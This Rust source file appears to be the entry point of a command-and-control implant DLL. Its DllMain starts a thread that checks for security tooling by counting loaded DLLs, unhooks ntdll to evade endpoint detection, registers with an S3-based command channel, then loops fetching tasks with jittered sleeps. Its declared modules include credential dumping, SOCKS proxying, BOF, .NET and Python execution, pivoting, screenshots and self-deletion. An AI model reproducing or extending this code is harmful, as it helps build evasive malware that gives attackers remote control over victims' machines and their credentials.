mod config;
mod checkin;
mod transport;
mod s3_transport;
mod crypto;
mod tasking;
mod features {
    pub mod exit;
    pub mod pong;
    pub mod filesystem;
    pub mod upload;
    pub mod download;
    pub mod psw;
    pub mod socks;
    pub mod executeBOF;
    pub mod executeDOT;
    pub mod executePY;
    pub mod list_processes;
    pub mod pivot;
    pub mod screenshot;
    pub mod selfdelete;
}
mod hellshall;
mod selfprotect;
mod worker;
mod helpers;
mod edrcheck;
mod unhook;

use std::{thread, time::Duration};

#[no_mangle]
pub extern "system" fn DllMain(
    _hinst: *mut u8,
    reason: u32,
    _reserved: *mut u8,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;

    if reason == DLL_PROCESS_ATTACH {
        thread::spawn(|| {
            run();
        });
    }
    1
}

fn run() {
    // === EDR CHECK: count loaded DLLs ===
    let dll_count = unsafe { edrcheck::count_loaded_modules() };
    if dll_count > config::MAX_LOADED_DLLS {
        loop {
            std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
        }
    }

    // === NTDLL UNHOOKING ===
    unsafe {
        unhook::unhook_ntdll();
    }

    // S3 bootstrap registration (get per-execution IAM credentials)
    if config::use_s3 {
        loop {
            match s3_transport::register() {
                Ok(_) => break,
                Err(e) => {
                    eprintln!("[REG] Registration failed: {}, retrying...", e);
                    helpers::sleep_with_jitter();
                }
            }
        }
    }

    checkin::checkin();

    loop {
        if let Err(e) = tasking::getTasking() {
            eprintln!("Tasking error: {}", e);
        }
        helpers::sleep_with_jitter();
    }
}
